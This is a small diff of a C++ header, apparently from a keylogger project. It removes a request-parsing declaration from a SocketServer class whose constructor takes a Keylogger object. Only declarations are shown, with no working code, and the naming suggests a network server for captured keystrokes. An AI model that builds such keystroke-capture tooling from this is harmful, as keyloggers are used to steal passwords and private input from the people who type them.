@@ -22,7 +22,6 @@ private:
 	std::string hostName;
 
 	void initHostInfo();
-	static std::vector<std::wstring> parseRequest(std::wstring request);
 public:
 	SocketServer(Keylogger* logger);
 	void start();
